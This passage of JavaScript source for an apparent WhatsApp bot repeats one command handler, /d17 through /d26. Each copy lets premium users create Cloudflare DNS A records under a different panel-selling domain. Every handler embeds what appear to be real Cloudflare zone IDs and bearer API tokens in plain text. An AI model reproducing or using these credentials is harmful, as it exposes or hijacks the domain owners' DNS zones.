                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break


      case '/d17': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/6283856419394")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "2feafa10ec4054af7cb04b18515013e5";
            let apitoken = "8WA6BgIuvFO5AL3xJZf3bsM0ts8aIZiFbxj90icK"
            let tld = "tokopanellmurah.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break


      case '/d18': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "2dc001900c742f289eef7dbae7ab784b";
            let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
            let tld = "bisnispanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d19': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "fb953c98b23bc7619f0e54701db07878";
            let apitoken = "ycq92Hz_KkhfnVPp-Zo83AtKIUaErg1UmkHRckm-"
            let tld = "xmartpanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d20': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "77c6588b3b36e74d07538e62ef91d6ba";
            let apitoken = "SgON4r6174fMe3h3B9wyP3caEtwUIfnVuNvSpl1k"
            let tld = "tokopanel.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d21': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "4049d75623d46e90d616fdf878a5ed84";
            let apitoken = "qwAWquCm1cqKEzZnZUEuAbfFq3PCOLleQZifxPog"
            let tld = "store-panel.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d22': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "8080d914883ed0b9e17d281f593df945";
            let apitoken = "BP2uUPgVfrM4pHW_ivo2AawAyiLqOMYoLYyS2BF7"
            let tld = "sellerpanel.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d23': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "6c4af9293eed7ea87c94d8effe5f2de2";
            let apitoken = "fxR0JgMIVwd0wvGIeBTymygdSMx1yNAN12lN8ure"
            let tld = "panellprivate.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d24': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "cada0ecef8f1e8d904435d469aef1b05";
            let apitoken = "54kx4yvi3CBqomC99WSaqZo9tbxHoe9U-ncBIVMx"
            let tld = "mypanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d25': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "d318f96a6327c5340d136415e860f545";
            let apitoken = "RTe9hBdh_-nt0wzOvYN183JyQC011yaiodQ7Po1b"
            let tld = "kangpanel.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d26': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "8132a433dc4eea653e38e168f2f45fc0";
            let apitoken = "33F2gfJ0cEoLv4NlEqLYGd6Ahc5_dzyUH_ClKuX_"
            let tld = "jasapanel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d27': {
